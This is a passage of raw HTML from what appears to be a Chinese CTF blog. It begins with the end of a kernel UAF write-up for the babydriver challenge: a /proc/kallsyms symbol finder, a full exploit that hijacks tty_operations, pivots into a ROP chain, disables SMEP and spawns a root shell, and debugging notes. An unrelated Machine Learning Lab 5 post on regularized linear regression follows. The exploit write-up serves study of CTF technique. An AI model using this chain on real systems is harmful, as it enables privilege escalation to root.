class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	find_symbols();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ $ /tmp/find </span><br><span class="line">commit_creds addr: <span class="number">0xffffffff810a1420</span></span><br><span class="line">prepare_kernel_cred addr: <span class="number">0xffffffff810a1810</span></span><br></pre></td></tr></table></figure>
<p>接下来就说一下攻击的原理：</p>
<ul>
<li>先通过 uaf 控制一个 <code>tty_struct</code> 结构（在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配）</li>
<li><code>tty_struct-&gt;tty_operations</code> 中有许多函数指针可以用来劫持</li>
<li>进行 stack pivot（栈迁移）到 rop 链的空间</li>
</ul>
<p>官方exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr 0xffffffff810a1420</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;		<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;		<span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;		<span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;		<span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">    rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>; <span class="comment">// pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line">    fake_tty_operations[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>; <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY); <span class="comment">// tty_struct已经申请到babydev_struct中</span></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">32</span>); <span class="comment">// 把tty_struct读取到fake_tty_struct</span></span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations; <span class="comment">// 修改tty_operations指向fake_tty_operations</span></span><br><span class="line">    write(fd2,fake_tty_struct, <span class="number">32</span>); <span class="comment">// 用fake_tty_struct覆盖tty_struct</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// buf压栈,作为栈迁移的跳板</span></span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了理解这个 exp，我们调试一下：</p>
<ul>
<li>获取 babydrive 模块的加载地址：（在 “/sys/module/” 中是加载的各个模块的信息）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/<span class="keyword">module</span>/babydriver/sections/.text </span><br><span class="line"><span class="number">0xffffffffc0000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 add-symbol-file 添加符号</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file babydriver.ko <span class="number">0xffffffffc0000000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;babydriver.ko&quot;</span> at</span><br><span class="line">	.text_addr = <span class="number">0xffffffffc0000000</span></span><br><span class="line">Reading symbols from babydriver.ko...</span><br></pre></td></tr></table></figure>
<img src="/2022/05/17/kernel%20UAF/1653064701599.png" class width="1653064701599"> 
<ul>
<li>在执行“write(fd_tty, buf, 8)”（“fake_tty_operations[7]-0xffffffff8181bfc5”）前停止</li>
<li>此时RAX为：“fake_tty_operations[0]-0xffffffff810635f5”（通过这个“rax + 0x38”可以看出来）</li>
<li>接下来就会执行：“mov rsp,rax ; dec ebx ; ret”（“fake_tty_operations[7]-0xffffffff8181bfc5”）</li>
<li>栈迁移为：“fake_tty_operations[0]-0xffffffff810635f5”</li>
<li>接着“ret”执行ROP链（“fake_tty_operations[1]”）</li>
<li>最后在ROP链中 <strong>bypass-smep</strong>，并且用 ret2usr 进行提权</li>
</ul>
<p>这里我要吐槽一句：kernel 的调试实在是太慢了，“ni”要足足执行一秒钟，还有这个 exp 是打不通的，必须把 boot.sh 中的 -enable-kvm 去掉才可以打通（快搞死我了）</p>
<hr>
<p><strong>小结：</strong></p>
<p>这是我的第二个 kernel pwn，感觉顺畅多了，这个题目给我提供了另一个提权的思路：UAF</p>
<p>目前有许多概念很是陌生，比如这个“cdev结构体”，我感觉它和 ucore 中的“vdev结构体”很像，但是就是不了解“cdev结构体”与其背后的机制</p>
<p>从 ucore 到 Linux 还是有距离的，那天抽时间整理一下 Linux 内核的知识</p>
<p>还有 kernel 是真的不好调试，太慢了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/Machine-Learning-Lab5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/17/Machine-Learning-Lab5/" class="post-title-link" itemprop="url">Machine-Learning-Lab5</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-17 14:52:39" itemprop="dateCreated datePublished" datetime="2022-05-17T14:52:39+08:00">2022-05-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:12" itemprop="dateModified" datetime="2022-10-10T00:08:12+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现正则化线性回归，并使用它来研究具有不同偏差-方差特性的模型</p>
<ul>
<li>ex5.m - Octave/MATLAB脚本，帮助您完成练习 </li>
<li>ex5data1.mat - 数据集 </li>
<li>submit.m - 将您的解决方案发送到我们的服务器 </li>
<li>featureNormalize.m - 标准化函数 </li>
<li>fmincg.m - 拟合函数，最小化例程（类似于fminunc） </li>
<li>plotFit.m - 绘制多项式拟合图 </li>
<li>trainLinearReg.m - 使用 fmincg 训练线性回归（代价函数为：均方误差）</li>
<li>[?] linearRegCostFunction.m - 正则线性回归代价函数</li>
<li>[?] learningCurve.m - 生成学习曲线 </li>
<li>[?] polyFeatures.m - 将数据映射到多项式特征空间 </li>
<li>[?] validationCurve.m - 生成交叉验证曲线 </li>
</ul>
<h2 id="Regularized-Linear-Regression（正则线性回归）"><a href="#Regularized-Linear-Regression（正则线性回归）" class="headerlink" title="Regularized Linear Regression（正则线性回归）"></a>Regularized Linear Regression（正则线性回归）</h2><p>在本练习的前半部分，您将使用正则化线性回归，利用水库水位的变化来预测流出大坝的水量，在下半部分中，您将完成一些调试学习算法的诊断，并检查偏差与方差的影响 </p>
<h2 id="Visualizing-the-dataset（可视化数据集）"><a href="#Visualizing-the-dataset（可视化数据集）" class="headerlink" title="Visualizing the dataset（可视化数据集）"></a>Visualizing the dataset（可视化数据集）</h2><p>首先，我们将可视化数据集，其中包含：</p>
<ul>
<li>水位变化的历史记录 x</li>
<li>流出大坝的水量 y </li>
</ul>
<p>该数据集分为三个部分：</p>
<ul>
<li>你的模型将学习的训练集：X，y</li>
<li>用于确定正则化参数的交叉验证集：Xval，yval</li>
<li>用于评估性能的测试集，这些是您的模型在培训期间没有看到的“看不见的”示例：Xtest、ytest</li>
</ul>
<p>代码实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ============================== 1.读取并显示数据 ==============================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data\ex5data1.mat&#x27;</span>)</span><br><span class="line"><span class="comment"># 用于训练模型</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line"><span class="comment"># 用于确定正则化参数的交叉验证</span></span><br><span class="line">Xval = data[<span class="string">&#x27;Xval&#x27;</span>]</span><br><span class="line">Yval = data[<span class="string">&#x27;yval&#x27;</span>].flatten()</span><br><span class="line"><span class="comment"># 用于评估性能</span></span><br><span class="line">Xtest = data[<span class="string">&#x27;Xtest&#x27;</span>]</span><br><span class="line">Ytest = data[<span class="string">&#x27;ytest&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line">plt.figure(<span class="number">1</span>)</span><br><span class="line">plt.scatter(X,Y,c=<span class="string">&#x27;r&#x27;</span>,marker=<span class="string">&#x27;x&#x27;</span>) <span class="comment"># 只显示&quot;用于训练模型&quot;的数据</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Change in water level (x)&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Water folowing out of the dam (y)&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<img src="/2022/05/17/Machine-Learning-Lab5/1652700354337.png" class width="1652700354337"> 
<h2 id="Regularized-linear-regression-cost-function（正则线性回归代价函数）"><a href="#Regularized-linear-regression-cost-function（正则线性回归代价函数）" class="headerlink" title="Regularized linear regression cost function（正则线性回归代价函数）"></a>Regularized linear regression cost function（正则线性回归代价函数）</h2><p>先看下正则化均方误差的公式：</p>
<script type="math/tex; mode=display">
J(θ)=\frac1{2m}[\sum_{i=1}^m(h_θ(x^{(i)})−y^{(i)})^2+λ\sum_{j=1}^nθ_j^{2}]</script><ul>
<li>其中 λ 是控制正则化程度的正则化参数（因此，有助于防止过度拟合）</li>
<li>正则化项对总成本 J(θ) 施加惩罚，随着模型参数 θ 的大小增加，惩罚也增加</li>
<li>注意：不应该正则化θ0项（在 Octave/MATLAB 中，θ0 项表示为 θ(1) ，因为 Octave/MATLAB 中的索引从1开始）</li>
</ul>
<p>相应地，正则化线性回归的代价对 θj 的偏导数定义为：</p>
<script type="math/tex; mode=display">
\frac{∂J(θ)}{∂θ_0}=\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)}\quad for\,\,j=0\\
\frac{∂J(θ)}{∂θ_0}=(\frac{1}{m}\sum_{i=1}^{m}(h_θ(x^{(i)})-y^{(i)})x_{j}^{(i)})+\frac{λ}{m}θ_j\quad for\,\,j>0</script><ul>
<li>注意：导数和梯度是一个概念，求解偏导数，就是求解梯度</li>
</ul>
<p>现在，您应该完成文件 linearRegCostFunction.m 中的代码，您的任务是编写一个函数来计算正则化线性回归成本函数，如果可能，尝试将代码矢量化，避免编写循环，然后在本函数中添加代码来计算梯度，并返回变量 grad</p>
<p>实现 linearRegCostFunction 函数：正则线性回归代价函数（均方误差）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;计算线性回归的代价和梯度&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_cost_function</span>(<span class="params">X,Y,theta,lmd</span>):</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	hyp = X.dot(theta) - Y</span><br><span class="line">	grad = np.zeros(theta.shape) </span><br><span class="line"></span><br><span class="line">	cost = ((hyp.T).dot(hyp) + lmd * (theta.T).dot(theta))/(<span class="number">2</span>*m)</span><br><span class="line"></span><br><span class="line">	temp = (X.T).dot(hyp)</span><br><span class="line">	grad[<span class="number">0</span>] = temp[<span class="number">0</span>]/ m</span><br><span class="line">	grad[<span class="number">1</span>:] = (temp[<span class="number">1</span>:] + lmd * theta[<span class="number">1</span>:])/m</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<ul>
<li>就是实现了一下上述公式，和实验二的 cost_Function_Reg 一样</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ============================ 2.计算代价和梯度 ==============================</span></span><br><span class="line">(m,n)= X.shape</span><br><span class="line">theta = np.ones((n+<span class="number">1</span>))</span><br><span class="line">lmd=<span class="number">1</span></span><br><span class="line">cost,grad = linear_cost_function(np.column_stack((np.ones(m),X)),Y,theta,lmd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at theta = [1  1]: &#123;:0.6f&#125;\n(this value should be about 303.993192)&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gradient at theta = [1  1]: &#123;&#125;\n(this value should be about [-15.303016  598.250744]&#x27;</span>.<span class="built_in">format</span>(grad))</span><br></pre></td></tr></table></figure>
<h2 id="Fitting-linear-regression（拟合线性回归）"><a href="#Fitting-linear-regression（拟合线性回归）" class="headerlink" title="Fitting linear regression（拟合线性回归）"></a>Fitting linear regression（拟合线性回归）</h2><p>将在 trainLinearReg.m 中运行代码，来计算 θ 的最佳值（使用 fmincg 拟合代价函数）</p>
<ul>
<li>在这一部分中，我们将正则化参数λ设置为“0”（因为我们目前线性回归的实现是试图拟合二维 θ，所以正则化对如此低维的θ没有明显的帮助）</li>
<li>在本练习的后面部分，您将使用带正则化的多项式回归</li>
<li>最后是 ex5.m 脚本还应绘制最佳拟合线，最佳拟合线会告诉我们：由于数据具有非线性模式，因此模型与数据的拟合度不高</li>
<li>虽然可视化显示最佳拟合是调试学习算法的一种可能方法，但可视化数据和模型并不总是容易的，在下一节中，您将实现一个生成学习曲线的函数，该函数可以帮助您调试学习算法，即使数据不容易可视化</li>
</ul>
<p>实现 trainLinearReg 函数：使用 fmincg 训练线性回归（代价函数为：均方误差）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> linearCostFunction <span class="keyword">import</span> linear_cost_function</span><br><span class="line"><span class="keyword">import</span> scipy.optimize <span class="keyword">as</span> opt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_linear_reg</span>(<span class="params">X,Y,lmd</span>):</span></span><br><span class="line">	init_theta = np.ones(X.shape[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">t</span>):</span></span><br><span class="line">		<span class="keyword">return</span> linear_cost_function(X,Y,t,lmd)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">grad_func</span>(<span class="params">t</span>):</span></span><br><span class="line">		<span class="keyword">return</span> linear_cost_function(X,Y,t,lmd)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	theta,*unused = opt.fmin_cg(cost_func,init_theta,grad_func,maxiter=<span class="number">200</span>,disp=<span class="literal">False</span>,full_output =<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> theta</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 fmincg 进行拟合</li>
</ul>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================== 3.训练线性回归 ===========================</span></span><br><span class="line">lmd = <span class="number">0</span></span><br><span class="line">theta = train_linear_reg(np.column_stack((np.ones(m),X)),Y,lmd)</span><br><span class="line">plt.plot(X,np.column_stack((np.ones(m),X)).dot(theta))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图结果：</p>
<img src="/2022/05/17/Machine-Learning-Lab5/1652705076474.png" class width="1652705076474"> 
